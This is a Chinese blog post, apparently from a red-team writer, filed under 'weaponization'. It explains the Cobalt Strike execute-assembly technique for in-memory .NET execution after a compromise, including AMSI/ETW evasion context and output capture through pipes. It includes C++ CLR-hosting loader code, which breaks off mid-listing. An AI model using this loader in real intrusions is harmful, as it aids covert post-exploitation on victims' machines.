@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Execute-NET-Assembly 
+      
+      
+      |
+    
+     oneday
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.jpg">
+    <link rel="icon" href="/images/favicon.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">oneday</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Execute-NET-Assembly</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-12-12 19:25:23
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E6%AD%A6%E5%99%A8%E5%8C%96/" title="武器化">
+                    <b>#</b> 武器化
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在 Cobalt Strike v3.x 到 v4.0 初期，<code>execute-assembly</code> 几乎是神一般的存在。</p>
+<ol>
+<li><strong>它开发效率高</strong>：依托于强大的NET框架，攻击者可以方便地开发各种攻击工具。</li>
+<li><strong>无文件攻击</strong>：一般通过网络传输net程序，并在内存中执行。</li>
+<li><strong>兼容性</strong>：Windows 默认安装 .NET Framework。</li>
+</ol>
+<p>正是凭借这些特性，该技术在BOF诞生之前曾一度备受攻击者青睐，并被频繁用于后渗透测试（Post-Exploitation）。然而，随着针对托管程序的监控（如 AMSI 和 ETW）日益严苛，加之 Fork&amp;Run模式的流量与内存特征过于明显，其攻击成功率已大幅下降。尽管目前它正逐渐被BOF 所取代，但这并不妨碍我们去深入探究其背后独特的<strong>攻击美学</strong>。</p>
+<p>为了避免出现fork&amp;run，出现了一个<a target="_blank" rel="noopener" href="https://github.com/anthemtotheego/InlineExecute-Assembly/tree/main">anthemtotheego&#x2F;InlineExecute-Assembly</a>改良的项目，这个项目的优点是在当前进程加载CLR，并执行.NET程序，缺点也很明显：<strong>如果.NET程序出现问题，会导致整个beacon进程奔溃</strong>。这个问题，是所有beacon内执行操作的通病，虽有缓解措施（增加异常处理），但治标不治本。</p>
+<p>还有另一个关键的技术就是如何<strong>获取.NET程序的输出</strong>。我翻遍了github的大部分项目，找了三种可行的方案，分别是使用<strong>匿名管道</strong>或<strong>命名管道</strong>或<strong>MailSlot</strong>他们三个的优劣我不就介绍。具体的使用的步骤大致一样，以匿名管道为例：</p>
+<ol>
+<li>创建匿名管道；</li>
+<li>保留原始标准输入的句柄；</li>
+<li>重定向标准输入和错误。</li>
+<li>创建一个线程从匿名管道的读端读取数据。这一步我卡了挺久，最开始我是抄<a target="_blank" rel="noopener" href="https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Dotnet.c">Havoc&#x2F;payloads&#x2F;Demon&#x2F;src&#x2F;core&#x2F;Dotnet.c at main · HavocFramework&#x2F;Havoc</a>的实现，但它并没创建线程这一步导致我不能如愿获取到C# 的执行结果。试了很多种方法，创建只有创建线程成功了，具体原因不知。</li>
+</ol>
+<p>一般而言，execute-assembly功能通常由C&#x2F;C++等非托管程序实现，为了能够在非托管程序执行托管程序，必须使用.NET Framework的<code>ICLRRuntimeHost</code>、<code>ICLRRuntimeInfo</code>和<code>ICLRMetaHost</code>这三个COM接口<strong>初始化CLR环境</strong>、<strong>获取程序域</strong>、<strong>装载程序集</strong>和<strong>执行程序集</strong>这四个核心骤。</p>
+<table>
+<thead>
+<tr>
+<th>接口</th>
+<th>作用</th>
+<th>关键方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ICLRMetaHost</strong></td>
+<td>发现&#x2F;枚举已安装的 CLR 版本</td>
+<td><code>GetRuntime</code></td>
+</tr>
+<tr>
+<td><strong>ICLRRuntimeInfo</strong></td>
+<td>获取特定版本 CLR 的接口，配置运行时</td>
+<td><code>GetInterface</code></td>
+</tr>
+<tr>
+<td><strong>ICorRuntimeHost</strong> (或 <strong>ICLRRuntimeHost</strong>)</td>
+<td>控制 CLR 生命周期、AppDomain</td>
+<td><code>Start</code>、<code>GetDefaultDomain</code>, <code>QueryInterface</code>、<code>UnloadDomain</code></td>
+</tr>
+</tbody></table>
+<p>而COM接口本质是<strong>内存布局严格约定的虚函数表（vtbl）</strong>，我们需要COM接口的某些函数去完成上述的四个核心步骤。对于C++来说，COM接口对开发者完全透明，我们不需要事先知道COM接口的实现，只用导入mscorlib库即可进行COM互操作。但是到了C语言，需手动声明接口结构体 + 函数指针，这涉及到COM的本质，我们到C语言实现的时候再详细说明。</p>
+<h1 id="二、execute-assembly的标准流程"><a href="#二、execute-assembly的标准流程" class="headerlink" title="二、execute-assembly的标准流程"></a>二、execute-assembly的标准流程</h1><p>一个标准的 <code>execute-assembly</code> 步骤如下：</p>
+<ol>
+<li><code>CLRCreateInstance</code>创建 <code>ICLRMetaHost</code> 接口，它管理者系统中所有安装的 .NET 版本。</li>
+<li><code>ICLRMetaHost-&gt;GetRuntime</code> 指定版本 <code>v4.0.30319</code>。此时并未启动，只是获取了该版本的配置信息。</li>
+<li><code>ICLRRuntimeInfo-&gt;GetInterface</code> 获取 <code>ICorRuntimeHost</code> 接口，它是控制CLR启动、停止的核心接口。</li>
+<li><code>ICorRuntimeHost-&gt;Start</code>在当前C&#x2F;C++进程内部就正式运行了一个.NET虚拟机。</li>
+<li><code>ICorRuntimeHost-&gt;GetDefaultDomain</code> 获取当前进程的默认 AppDomain 的 <code>IUnknown</code> 指针，.NET 代码必须运行在应用程序域 (AppDomain) 中。</li>
+<li><code>IUnknown-&gt;QueryInterface</code> 利用 COM 标准的 <code>QueryInterface</code> 将通用的 <code>IUnknown</code> 指针转换为具体的 <code>AppDomain</code> 接口指针。有了 <code>AppDomain</code> 指针，才能调用后续的 <code>Load_3</code> 方法。</li>
+<li><code>AppDomain-&gt;Load_3</code> 获取 <code>IAssembly</code> 接口，这等同于 C# 中的 <code>Assembly.Load(byte[])</code>，用于加载.NET程序集。</li>
+<li><code>IAssembly-&gt;EntryPoint</code> 获取 <code>IMethodInfo</code> 接口，包含了 <code>Main</code> 函数的元数据。</li>
+<li><code>IMethodInfo-&gt;Invoke_3</code> 此时控制权移交给 .NET 的 JIT 编译器，代码开始执行。</li>
+</ol>
+<p>上面主要介绍了各种接口的函数调用顺序，并没有涉及到其他细枝末节的东西，请阅读源代码了解跟更多细节。</p>
+<h1 id="三、C-版本"><a href="#三、C-版本" class="headerlink" title="三、C++版本"></a>三、C++版本</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line"></span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;mscoree.h&gt;</span><br><span class="line">#include &lt;MetaHost.h&gt;</span><br><span class="line">#include &lt;strsafe.h&gt;</span><br><span class="line">#include &lt;<span class="type">string</span>&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;thread&gt; <span class="comment">// 引入多线程支持</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 链接必要的库</span></span><br><span class="line">#pragma comment(lib, <span class="string">&quot;mscoree.lib&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入 mscorlib.tlb</span></span><br><span class="line">#<span class="keyword">import</span> <span class="string">&quot;mscorlib.tlb&quot;</span> raw_interfaces_only, auto_rename high_property_prefixes(<span class="string">&quot;_get&quot;</span>,<span class="string">&quot;_put&quot;</span>,<span class="string">&quot;_putref&quot;</span>) rename(<span class="string">&quot;ReportEvent&quot;</span>, <span class="string">&quot;InteropServices_ReportEvent&quot;</span>)</span><br><span class="line"></span><br><span class="line">using namespace mscorlib;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line">ICorRuntimeHost* g_Runtime = NULL;</span><br><span class="line">HANDLE g_OrigninalStdOut = INVALID_HANDLE_VALUE;</span><br><span class="line">HANDLE g_OrigninalStdErr = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 线程函数：专门负责从管道中读取数据</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line">void PipeReaderThread(HANDLE hPipeRead, std::<span class="type">string</span>* outputBuffer)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="type">int</span> BUFSIZE = <span class="number">4096</span>;</span><br><span class="line">    char buffer[BUFSIZE];</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    BOOL bSuccess = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取，直到管道被关闭（ReadFile 返回 FALSE 或 0字节）</span></span><br><span class="line">    while (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 这是一个阻塞调用，直到有数据或管道断开</span></span><br><span class="line">        bSuccess = ReadFile(hPipeRead, buffer, BUFSIZE, &amp;bytesRead, NULL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!bSuccess || bytesRead == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        outputBuffer-&gt;<span class="built_in">append</span>(buffer, bytesRead);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 加载 CLR 环境</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line">HRESULT LoadCLR()</span><br><span class="line">&#123;</span><br><span class="line">    HRESULT hr;</span><br><span class="line">    ICLRMetaHost* pMetaHost = NULL;</span><br><span class="line">    ICLRRuntimeInfo* pRuntimeInfo = NULL;</span><br><span class="line">    BOOL bLoadable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取 MetaHost</span></span><br><span class="line">    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&amp;pMetaHost);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 指定加载 .NET v4.0.30319</span></span><br><span class="line">    hr = pMetaHost-&gt;GetRuntime(L<span class="string">&quot;v4.0.30319&quot;</span>, IID_ICLRRuntimeInfo, (LPVOID*)&amp;pRuntimeInfo);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检查是否可加载</span></span><br><span class="line">    hr = pRuntimeInfo-&gt;IsLoadable(&amp;bLoadable);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr) || !bLoadable) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取运行时接口</span></span><br><span class="line">    hr = pRuntimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&amp;g_Runtime);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 启动 CLR</span></span><br><span class="line">    hr = g_Runtime-&gt;Start();</span><br><span class="line"></span><br><span class="line">Cleanup:</span><br><span class="line">    <span class="keyword">if</span> (pMetaHost) pMetaHost-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (pRuntimeInfo) pRuntimeInfo-&gt;Release();</span><br><span class="line">    <span class="keyword">return</span> hr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 在内存中加载并执行 .NET 程序集 (Execute-Assembly 核心)</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line">HRESULT CallMethod(std::<span class="type">string</span> assembly, std::<span class="type">string</span> args) &#123;</span><br><span class="line">    HRESULT hr = S_OK;</span><br><span class="line">    SAFEARRAY* psaArguments = NULL;</span><br><span class="line">    IUnknownPtr pUnk = NULL;</span><br><span class="line">    _AppDomainPtr pAppDomain = NULL;</span><br><span class="line">    _AssemblyPtr pAssembly = NULL;</span><br><span class="line">    _MethodInfo* pEntryPt = NULL;</span><br><span class="line">    SAFEARRAYBOUND bounds[<span class="number">1</span>];</span><br><span class="line">    SAFEARRAY* psaBytes = NULL;</span><br><span class="line">    LONG rgIndices = <span class="number">0</span>;</span><br><span class="line">    wchar_t* w_ByteStr = NULL;</span><br><span class="line">    LPWSTR* szArglist = NULL;</span><br><span class="line">    <span class="type">int</span> nArgs = <span class="number">0</span>;</span><br><span class="line">    VARIANT vReturnVal;</span><br><span class="line">    VARIANT vEmpty;</span><br><span class="line">    VARIANT vtPsa;</span><br><span class="line"></span><br><span class="line">    SecureZeroMemory(&amp;vReturnVal, sizeof(VARIANT));</span><br><span class="line">    SecureZeroMemory(&amp;vEmpty, sizeof(VARIANT));</span><br><span class="line">    SecureZeroMemory(&amp;vtPsa, sizeof(VARIANT));</span><br><span class="line">    vEmpty.vt = VT_NULL;</span><br><span class="line">    vtPsa.vt = (VT_ARRAY | VT_BSTR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取默认 AppDomain</span></span><br><span class="line">    hr = g_Runtime-&gt;GetDefaultDomain(&amp;pUnk);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    hr = pUnk-&gt;QueryInterface(IID_PPV_ARGS(&amp;pAppDomain));</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 将 string 二进制转换为 SafeArray</span></span><br><span class="line">    bounds[<span class="number">0</span>].cElements = (ULONG)assembly.size();</span><br><span class="line">    bounds[<span class="number">0</span>].lLbound = <span class="number">0</span>;</span><br><span class="line">    psaBytes = SafeArrayCreate(VT_UI1, <span class="number">1</span>, bounds);</span><br><span class="line">    SafeArrayLock(psaBytes);</span><br><span class="line">    memcpy(psaBytes-&gt;pvData, assembly.data(), assembly.size());</span><br><span class="line">    SafeArrayUnlock(psaBytes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 加载程序集 (Load_3 = AppDomain.Load(byte[]))</span></span><br><span class="line">    hr = pAppDomain-&gt;Load_3(psaBytes, &amp;pAssembly);</span><br><span class="line">    SafeArrayDestroy(psaBytes); <span class="comment">// 这里的 Destroy 可能会有争议，但在 Load 后通常是安全的，或者可以留到最后</span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取 EntryPoint (Main 函数)</span></span><br><span class="line">    hr = pAssembly-&gt;get_EntryPoint(&amp;pEntryPt);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">goto</span> Cleanup;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 处理命令行参数</span></span><br><span class="line">    <span class="keyword">if</span> (args.empty()) &#123;</span><br><span class="line">        vtPsa.parray = SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        w_ByteStr = (wchar_t*)malloc((sizeof(wchar_t) * args.size() + <span class="number">1</span>));</span><br><span class="line">        mbstowcs(w_ByteStr, (char*)args.data(), args.size() + <span class="number">1</span>);</span><br><span class="line">        szArglist = CommandLineToArgvW(w_ByteStr, &amp;nArgs);</span><br><span class="line"></span><br><span class="line">        vtPsa.parray = SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, nArgs);</span><br><span class="line">        <span class="keyword">for</span> (long i = <span class="number">0</span>; i &lt; nArgs; i++) &#123;</span><br><span class="line">            BSTR strParam1 = SysAllocString(szArglist[i]);</span><br><span class="line">            SafeArrayPutElement(vtPsa.parray, &amp;i, strParam1);</span><br><span class="line">        &#125;</span><br><span class="line">        free(w_ByteStr); <span class="comment">// 释放临时内存</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    psaArguments = SafeArrayCreateVector(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    hr = SafeArrayPutElement(psaArguments, &amp;rgIndices, &amp;vtPsa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 执行 Main 函数！</span></span><br><span class="line">    <span class="comment">// 此时 StdOut 已经被重定向到管道，所以输出会进入管道</span></span><br><span class="line">    hr = pEntryPt-&gt;Invoke_3(vEmpty, psaArguments, &amp;vReturnVal);</span><br><span class="line"></span><br><span class="line">Cleanup:</span><br><span class="line">    VariantClear(&amp;vReturnVal);</span><br><span class="line">    <span class="keyword">if</span> (NULL != psaArguments) SafeArrayDestroy(psaArguments);</span><br><span class="line">    <span class="keyword">if</span> (pAssembly) pAssembly-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (pAppDomain) pAppDomain-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (pUnk) pUnk-&gt;Release();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 编排函数：创建管道 -&gt; 启动线程 -&gt; 执行 -&gt; 收集结果</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line">std::<span class="type">string</span> ExecuteAssemblyWithPipe(std::<span class="type">string</span>&amp; assembly, std::<span class="type">string</span> args)</span><br><span class="line">&#123;</span><br><span class="line">    HRESULT hr;</span><br><span class="line">    std::<span class="type">string</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    HANDLE hPipeRead = NULL;</span><br><span class="line">    HANDLE hPipeWrite = NULL;</span><br><span class="line">    SECURITY_ATTRIBUTES saAttr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 加载 CLR (如果还没加载)</span></span><br><span class="line">    <span class="keyword">if</span> (g_Runtime == NULL) &#123;</span><br><span class="line">        hr = LoadCLR();</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr)) <span class="keyword">return</span> <span class="string">&quot;Error: Failed to load CLR\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 创建匿名管道</span></span><br><span class="line">    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);</span><br><span class="line">    saAttr.bInheritHandle = TRUE; <span class="comment">// 关键：允许句柄被继承/使用</span></span><br><span class="line">    saAttr.lpSecurityDescriptor = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CreatePipe(&amp;hPipeRead, &amp;hPipeWrite, &amp;saAttr, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: CreatePipe failed\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 保存原始 StdOut/StdErr</span></span><br><span class="line">    g_OrigninalStdOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    g_OrigninalStdErr = GetStdHandle(STD_ERROR_HANDLE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 重定向 StdOut/StdErr 到管道写入端</span></span><br><span class="line">    <span class="keyword">if</span> (!SetStdHandle(STD_OUTPUT_HANDLE, hPipeWrite) || !SetStdHandle(STD_ERROR_HANDLE, hPipeWrite)) &#123;</span><br><span class="line">        CloseHandle(hPipeRead);</span><br><span class="line">        CloseHandle(hPipeWrite);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: SetStdHandle failed\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 启动后台线程读取管道 (防止缓冲区满死锁)</span></span><br><span class="line">    std::thread reader(PipeReaderThread, hPipeRead, &amp;output);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 执行 .NET 程序 (阻塞直到完成)</span></span><br><span class="line">    CallMethod(assembly, args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 恢复原始 StdOut (必须在关闭 Write 句柄前恢复，否则 printf 可能异常)</span></span><br><span class="line">    SetStdHandle(STD_OUTPUT_HANDLE, g_OrigninalStdOut);</span><br><span class="line">    SetStdHandle(STD_ERROR_HANDLE, 